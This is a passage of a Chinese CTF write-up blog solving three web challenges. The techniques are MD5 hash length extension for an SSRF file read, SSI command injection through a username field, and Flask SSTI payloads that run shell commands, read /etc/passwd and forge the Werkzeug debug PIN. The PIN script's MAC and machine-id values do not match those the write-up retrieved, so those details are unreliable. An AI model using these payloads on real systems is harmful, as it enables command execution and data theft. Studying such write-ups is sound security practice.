class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><br><span class="line">        <span class="variable language_">self</span>.action = action</span><br><span class="line">        <span class="variable language_">self</span>.param = param</span><br><span class="line">        <span class="variable language_">self</span>.sign = sign</span><br><span class="line">        <span class="variable language_">self</span>.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="variable language_">self</span>.sandbox):</span><br><span class="line">            os.mkdir(<span class="variable language_">self</span>.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">500</span>&#125;</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.checkSign():</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> <span class="variable language_">self</span>.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % <span class="variable language_">self</span>.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(<span class="variable language_">self</span>.param)</span><br><span class="line">                <span class="keyword">if</span> resp == <span class="string">&quot;Connection Timeout&quot;</span>:</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> <span class="variable language_">self</span>.action:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % <span class="variable language_">self</span>.sandbox, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                        result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> getSign(<span class="variable language_">self</span>.action, <span class="variable language_">self</span>.param) == <span class="variable language_">self</span>.sign</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> waf(param):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    </span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">return</span> check.startswith((<span class="string">&quot;gopher&quot;</span>, <span class="string">&quot;file&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
### 大体代码的功能重点在/geneSign的计算md5和/De1ta的触发task.Exec()来scan访问并写入文件和read读取文件
### 漏洞存在于task.Exec()函数中的scan和read两个分支，在通过scan的`urllib.urlopen(param).read()[:50]`来进行ssrf写入数据后，再通过read来读取并回显数据，即可达成ssrf
### 但是在scan分支中存在对于gopher和file两个协议的waf，限制了我们直接通过scan获取数据
### 同时在执行task.Exec()函数时要保证cookie中的sign与action匹配，由于/geneSign的计算md5功能默认action为scan，所以想要获得read功能还要进一步操作
### 首先，直接爆破md5获得key肯定是不太现实了，不过注意到在task.Exec()函数中判断分支用的是`if "xxx" in xxx` ,所以我们可以让scan和read在同一个action中，也就是构造scanread或者readscan这两种action，这两个也对应了两种不同的绕过方法
### 首先是构造scanread对应的sign，这就要用到HASH长度拓展攻击
[HASH长度拓展攻击](https://www.cnblogs.com/yunen/p/13624595.html)
### 首先先去/geneSign的计算一下scan为action的md5，再利用工具得到在原字符串后面加上read后对应的md5
>第一次尝试param为http://127.0.0.1/flag.txt
PS E:\ctf\web\tools\hash-ext-attack-master> python hash_ext_attack.py   
2025-03-01 11:07:50.713 | DEBUG    | common.md5_manual:__init__:17 - init......
请输入已知明文：scan
请输入已知hash： 8f7ea5b28a9ba1ac99e1d7cf503fd7a1
请输入扩展字符: read
请输入密钥长度：41
2025-03-01 11:08:03.952 | INFO     | common.HashExtAttack:run:65 - 已知明文：b'scan'
2025-03-01 11:08:03.954 | INFO     | common.HashExtAttack:run:66 - 已知hash：b'8f7ea5b28a9ba1ac99e1d7cf503fd7a1'
2025-03-01 11:08:03.955 | INFO     | common.HashExtAttack:run:68 - 新明文：b'scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00h\x01\x00\x00\x00\x00\x00\x00read'
2025-03-01 11:08:03.956 | INFO     | common.HashExtAttack:run:69 - 新明文(url编码)：scan%80%00%00%00%00%00%00%00%00%00%00h%01%00%00%00%00%00%00read
2025-03-01 11:08:03.957 | INFO     | common.HashExtAttack:run:71 - 新hash:bb72f50510b6ddcb0ae36f2a98fcba4c

>第二次尝试param为flag.txt
PS E:\ctf\web\tools\hash-ext-attack-master> python hash_ext_attack.py
2025-03-01 11:09:09.095 | DEBUG    | common.md5_manual:__init__:17 - init......
请输入已知明文：scan
请输入已知hash： 2e46cf8b94b682f1bb7b2ea87a86d387
请输入扩展字符: read
请输入密钥长度：24
2025-03-01 11:09:19.204 | INFO     | common.HashExtAttack:run:65 - 已知明文：b'scan'
2025-03-01 11:09:19.207 | INFO     | common.HashExtAttack:run:66 - 已知hash：b'2e46cf8b94b682f1bb7b2ea87a86d387'
2025-03-01 11:09:19.208 | INFO     | common.HashExtAttack:run:68 - 新明文：b'scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read'
2025-03-01 11:09:19.209 | INFO     | common.HashExtAttack:run:69 - 新明文(url编码)：scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%E0%00%00%00%00%00%00%00read
2025-03-01 11:09:19.210 | INFO     | common.HashExtAttack:run:71 - 新hash:59ea99be204ee960afcf37c80d841291

### 得到新明文和新hash后作为cookie传入/De1ta，同时get传入param进行读取，写入，回显操作
### 运用第一个http协议读取文件失败
![6866403029738ec21f81ef3f0d2a22f2.png](https://pics.lwzheng.tech/2025/03/01/67c27b5899f41.png)
>这里是使用的 urllib.urlopen(param) 去包含的文件，所以可以直接加上文件路径 flag.txt 或 ./flag.txt 去访问，也可以使用类似的 file:///app/flag.txt 去访问，但是 file 关键字在黑名单里，可以使用 local_file 代替

### 直接用flag.txt作为参数读取成功
![2f135cca878fc01f89e7b1f0d3dc5eb3.png](https://pics.lwzheng.tech/2025/03/01/67c27b632ebd9.png)
### 然后就是第二种解法，也就是构造action为readscan
### 观察md5生成参数为secert_key + param + action，中间param的参数是我们可控的，所以我们可以通过将read放在param的结尾，这样就等效生成了action为readscan的md5
>param=flag.txtread
param+action=flag.txtreadscan

### 然后将生成后的md5作为cookies传入即可得到flag
### 最后还有一种方法就是利用local_file协议代替file协议读取文件，也就是把第二种方法里面的flag.txt换成local_file:///app/flag.txt即可
# [BJDCTF2020]EasySearch
### 访问后是个登录页面，先试试sql注入，无果，dirsearch扫一下，扫出来index.php.swp备份文件，访问后得到源代码
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line">        <span class="variable">$random</span> = <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">uniqid</span>().<span class="variable">$random</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">sha1</span>(<span class="variable">$content</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">    ***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.<span class="title function_ invoke__">get_hash</span>().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    ***</span><br><span class="line">    &#125;</span><br><span class="line">    ***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
### 首先是md5，需要password的前6位为6d0bc1，脚本爆破一下
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">admin=<span class="string">&#x27;6d0bc1&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    s = hashlib.md5(<span class="built_in">str</span>(i).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> s[:<span class="number">6</span>] == admin:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure>
### 得到2020666满足条件
### 然后登录
### 然后就是他会生成一个目录为`public/".get_hash().".shtml`的shtml文件
>Apache SSI 远程命令执行漏洞复现
一、漏洞描述
当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用`<!--#exec cmd=”id” -->`语法执行命令。
使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为"服务器端嵌入"或者叫"服务器端包含"，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。

### 那么路径在哪呢，在响应包里面藏着
>Url_Is_Here:public/31bbdcfc00320a0e7816548a7172bc5ffabea887.shtml

### 访问该目录，联系前面源代码$text里面强调出的`<h1>Hello,'.$_POST['username'].'</h1>`,判断可能要通过username进行ssi命令执行
### 回到刚才登录界面，将username改为`<!--#exec cmd=”ls” -->`,进行命令执行
### 直接ls发现有很多.shtml文件，并没有发现flag，继续ls ../来看目录上一层，发现flag，进行cat得到flag

# [GYCTF2020]FlaskApp
### 访问后能base加解密，同时会把结果回显到页面上，还是flask，猜测为ssti
### 尝试`&#123;&#123;1+1&#125;&#125;</code>后回显果然为2，但是直接命令执行被waf，尝试后发现os,improt,eval,popen等被waf，拼接绕过</p>
<blockquote>
<p><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125; &#123;% if c.__name__=='_IterationGuard' %&#125; &#123;&#123; c.__init__.__globals__['__builtins__']['e'+'val']('__impor'+'t__'+'("o'+'s")'+'.pope'+'n'+'("ls /").read()') &#125;&#125; &#123;% endif %&#125; &#123;% endfor %&#125;</code></p>
</blockquote>
<h3 id="得到flag文件夹名为this-is-the-flag-txt-直接读取发现flag被过滤，用-1-进行字符倒转输出"><a href="#得到flag文件夹名为this-is-the-flag-txt-直接读取发现flag被过滤，用-1-进行字符倒转输出" class="headerlink" title="得到flag文件夹名为this_is_the_flag.txt,直接读取发现flag被过滤，用[::-1]进行字符倒转输出"></a>得到flag文件夹名为this_is_the_flag.txt,直接读取发现flag被过滤，用[::-1]进行字符倒转输出</h3><blockquote>
<p><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125; &#123;% if c.__name__=='_IterationGuard' %&#125; &#123;&#123; c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() &#125;&#125; &#123;% endif %&#125; &#123;% endfor %&#125;</code></p>
</blockquote>
<h3 id="得到flag-4"><a href="#得到flag-4" class="headerlink" title="得到flag"></a>得到flag</h3><h3 id="hint界面源代码中有个pin的字样，同时在我们输入错误的数据时会回显报错界面，代表开启了debug模式，所以我们可以通过生成pin码来进入调试模式进行命令执行"><a href="#hint界面源代码中有个pin的字样，同时在我们输入错误的数据时会回显报错界面，代表开启了debug模式，所以我们可以通过生成pin码来进入调试模式进行命令执行" class="headerlink" title="hint界面源代码中有个pin的字样，同时在我们输入错误的数据时会回显报错界面，代表开启了debug模式，所以我们可以通过生成pin码来进入调试模式进行命令执行"></a>hint界面源代码中有个pin的字样，同时在我们输入错误的数据时会回显报错界面，代表开启了debug模式，所以我们可以通过生成pin码来进入调试模式进行命令执行</h3><h3 id="要生成pin码，我们需要知道以下几个信息"><a href="#要生成pin码，我们需要知道以下几个信息" class="headerlink" title="要生成pin码，我们需要知道以下几个信息"></a>要生成pin码，我们需要知道以下几个信息</h3><h4 id="（1）flask所登录的用户名。可以通过读取-etc-password知道-用户为flaskweb"><a href="#（1）flask所登录的用户名。可以通过读取-etc-password知道-用户为flaskweb" class="headerlink" title="（1）flask所登录的用户名。可以通过读取&#x2F;etc&#x2F;password知道 用户为flaskweb"></a>（1）flask所登录的用户名。可以通过读取&#x2F;etc&#x2F;password知道 用户为flaskweb</h4><blockquote>
<p><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125; &#123;% if c.__name__=='_IterationGuard' %&#125; &#123;&#123; c.__init__.__globals__['__builtins__'].open('/etc/passwd','r').read() &#125;&#125; &#123;% endif %&#125; &#123;% endfor %&#125;</code><br>flaskweb:x:1000:1000::&#x2F;home&#x2F;flaskweb:&#x2F;bin&#x2F;sh </p>
</blockquote>
<h4 id="2-modname-一般不变就是flask-app"><a href="#2-modname-一般不变就是flask-app" class="headerlink" title="(2) modname 一般不变就是flask.app"></a>(2) modname 一般不变就是flask.app</h4><h4 id="3-getattr-app-“name”-app-class-name-。python该值一般为Flask-，值一般不变"><a href="#3-getattr-app-“name”-app-class-name-。python该值一般为Flask-，值一般不变" class="headerlink" title="(3)getattr(app, “name”, app.class.name)。python该值一般为Flask ，值一般不变"></a>(3)getattr(app, “name”, app.class.name)。python该值一般为Flask ，值一般不变</h4><h4 id="4-flask库下app-py的绝对路径。在报错信息中可以获取此值为：-usr-local-lib-python3-7-site-packages-flask-app-py"><a href="#4-flask库下app-py的绝对路径。在报错信息中可以获取此值为：-usr-local-lib-python3-7-site-packages-flask-app-py" class="headerlink" title="(4)flask库下app.py的绝对路径。在报错信息中可以获取此值为： &#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py"></a>(4)flask库下app.py的绝对路径。在报错信息中可以获取此值为： &#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py</h4><p><img src="https://pics.lwzheng.tech/2025/03/01/67c2d1505f97f.png" alt="56084b2b784481bb4a3e9f50aec874cf.png"></p>
<h4 id="5-当前网络的mac地址的十进制数。通过文件-sys-class-net-eth0-address读取，eth0为当前使用的网卡："><a href="#5-当前网络的mac地址的十进制数。通过文件-sys-class-net-eth0-address读取，eth0为当前使用的网卡：" class="headerlink" title="(5)当前网络的mac地址的十进制数。通过文件&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address读取，eth0为当前使用的网卡："></a>(5)当前网络的mac地址的十进制数。通过文件&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address读取，eth0为当前使用的网卡：</h4><blockquote>
<p><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125; &#123;% if c.__name__=='_IterationGuard' %&#125; &#123;&#123; c.__init__.__globals__['__builtins__'].open('/sys/class/net/eth0/address','r').read() &#125;&#125; &#123;% endif %&#125; &#123;% endfor %&#125;</code><br>06:72:f9:05:ef:f9   -&gt; 0672f905eff9(hex)  -&gt;  7090873954297(dec)</p>
</blockquote>
<h4 id="6-docker机器id"><a href="#6-docker机器id" class="headerlink" title="(6)docker机器id"></a>(6)docker机器id</h4><h4 id="对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在-etc-machine-id或-proc-sys-kernel-random-boot-i，有的系统没有这两个文件。"><a href="#对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在-etc-machine-id或-proc-sys-kernel-random-boot-i，有的系统没有这两个文件。" class="headerlink" title="对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在&#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i，有的系统没有这两个文件。"></a>对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在&#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i，有的系统没有这两个文件。</h4><h4 id="对于docker机则读取-proc-self-cgroup，其中第一行的-docker-字符串后面的内容作为机器的id，"><a href="#对于docker机则读取-proc-self-cgroup，其中第一行的-docker-字符串后面的内容作为机器的id，" class="headerlink" title="对于docker机则读取&#x2F;proc&#x2F;self&#x2F;cgroup，其中第一行的&#x2F;docker&#x2F;字符串后面的内容作为机器的id，"></a>对于docker机则读取&#x2F;proc&#x2F;self&#x2F;cgroup，其中第一行的&#x2F;docker&#x2F;字符串后面的内容作为机器的id，</h4><blockquote>
<p><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125; &#123;% if c.__name__=='_IterationGuard' %&#125; &#123;&#123; c.__init__.__globals__['__builtins__'].open('/proc/self/cgroup','r').read() &#125;&#125; &#123;% endif %&#125; &#123;% endfor %&#125;</code><br>13:devices:&#x2F;kubepods.slice&#x2F;kubepods-burstable.slice&#x2F;kubepods-burstable-pod56b2fc0f_dbd1_4e2c_93b6_e930e63086eb.slice&#x2F;docker-<code>fac826f739237326f2957bfb529f181e32affa8facc870145229422e8366153c</code>.scope</p>
</blockquote>
<h3 id="生成pin码"><a href="#生成pin码" class="headerlink" title="生成pin码"></a>生成pin码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377871320&#x27;</span><span class="comment"># str(uuid.getnode()),  /sys/class/net/eth0/address</span></span><br><span class="line">    <span class="string">&#x27;31c24e0fd34a09126aa47d88e21b8b28efcce8acd630632e4e4a9baddff38757&#x27;</span>, <span class="comment"># get_machine_id(),/etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    